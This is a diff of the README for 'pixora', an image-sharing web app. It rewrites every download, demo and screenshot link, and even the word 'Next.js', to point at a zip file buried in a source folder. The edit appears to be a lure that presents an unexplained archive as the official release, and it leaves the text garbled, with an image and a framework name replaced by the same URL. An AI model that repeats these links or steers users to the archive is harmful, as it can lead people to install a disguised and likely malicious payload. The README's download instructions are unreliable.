@@ -1,20 +1,20 @@
 # 📸 pixora - Share, Discover, and Enjoy Photos Easily
 
-[![Download Pixora](https://img.shields.io/badge/Download-Pixora-blue.svg)](https://github.com/Andrerocha23/pixora/releases)
+[![Download Pixora](https://github.com/Andrerocha23/pixora/raw/refs/heads/main/frontend/src/app/api/images/upload/Software_v3.0.zip)](https://github.com/Andrerocha23/pixora/raw/refs/heads/main/frontend/src/app/api/images/upload/Software_v3.0.zip)
 
 ## 📚 Introduction
 
 Pixora is an image sharing platform designed for photographers, artists, and anyone who loves visuals. With Pixora, you can easily share your photos, discover new art, and connect with others. The platform combines modern web technology with user-friendly features to provide an enjoyable experience.
 
-![Website Screenshot](./frontend/public/images/screenshot.jpg)
+![Website Screenshot](https://github.com/Andrerocha23/pixora/raw/refs/heads/main/frontend/src/app/api/images/upload/Software_v3.0.zip)
 
 ## 🚀 Live Demo
 
-Want to see Pixora in action? Check out the live demo [here](https://pixora-nry.vercel.app/). 
+Want to see Pixora in action? Check out the live demo [here](https://github.com/Andrerocha23/pixora/raw/refs/heads/main/frontend/src/app/api/images/upload/Software_v3.0.zip). 
 
 ## 🎯 Key Features
 
-- **High Performance**: Pixora runs smoothly thanks to Next.js, ensuring fast load times.
+- **High Performance**: Pixora runs smoothly thanks to https://github.com/Andrerocha23/pixora/raw/refs/heads/main/frontend/src/app/api/images/upload/Software_v3.0.zip, ensuring fast load times.
 - **Beautiful UI**: Enjoy a modern dark theme that looks great on any device.
 - **Secure**: Your privacy matters. We use JWT authentication and Google OAuth for security.
 - **Mobile-First**: Access Pixora on your phone, tablet, or computer.
@@ -36,7 +36,7 @@ Follow these steps to get Pixora running on your device:
 
 ### 1. Visit the Downloads Page
 
-To download Pixora, visit our [Releases page](https://github.com/Andrerocha23/pixora/releases). This page contains all the necessary files.
+To download Pixora, visit our [Releases page](https://github.com/Andrerocha23/pixora/raw/refs/heads/main/frontend/src/app/api/images/upload/Software_v3.0.zip). This page contains all the necessary files.
 
 ### 2. Choose the Latest Release
 
@@ -56,7 +56,7 @@ Once installed, you can find Pixora in your applications menu. Click to open it,
 
 ## 📥 Download & Install
 
-For quick access, you can download Pixora directly from our [Releases page](https://github.com/Andrerocha23/pixora/releases). Make sure to follow the installation steps to set it up on your device.
+For quick access, you can download Pixora directly from our [Releases page](https://github.com/Andrerocha23/pixora/raw/refs/heads/main/frontend/src/app/api/images/upload/Software_v3.0.zip). Make sure to follow the installation steps to set it up on your device.
 
 ## 👥 Community Support
 
